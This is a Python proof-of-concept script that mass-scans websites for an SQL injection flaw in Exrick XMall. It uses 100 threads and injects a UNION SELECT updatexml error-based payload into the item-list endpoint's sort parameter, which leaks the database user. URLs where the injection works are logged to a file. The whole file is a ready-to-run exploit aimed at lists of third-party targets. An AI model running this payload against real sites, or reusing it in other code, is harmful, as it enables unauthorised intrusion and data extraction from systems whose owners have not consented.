import requests
import sys
import argparse
import re
import logging
from multiprocessing.dummy import Pool

# 禁用 urllib3 警告
requests.packages.urllib3.disable_warnings()

# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


# 定义程序的横幅
def banner():
    test = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|



                            version:1.1.0
                            author:Hardog                                    
"""
    logging.info(test)


# 主函数
def main():
    banner()  # 打印欢迎界面
    parser = argparse.ArgumentParser(description="Exrick XMall SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    # 判断输入的参数是单个 URL 还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        # 多线程处理
        with Pool(100) as mp:
            mp.map(poc, url_list)
    else:
        logging.error("Usage:\n\t python3 {} -h".format(sys.argv[0]))


# 漏洞检测函数
def poc(target):
    # 构造 payload 的 URL
    payload_url = '/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
    url = target + payload_url
    headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/125.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close',
    }

    try:
        res = requests.get(url=url, headers=headers, timeout=5)
        # 使用正则表达式匹配 XPATH 语法错误信息
        match = re.search(r'XPATH syntax error: ([^\n]*)', res.text)
        if match:
            logging.info(f"{GREEN}[+] 该网站存在 SQL 注入漏洞，url为: {target}{RESET}")
            with open("Exricre.txt", "a", encoding="utf-8") as fp:
                fp.write(target + '\n')
        else:
            logging.info(f"[-] 该网站不存在 SQL 注入漏洞: {target}")

    except Exception as e:
        logging.error(f"[*] 该网站无法访问，url为: {target}, 错误信息: {e}")


# 程序入口
if __name__ == '__main__':
    main()
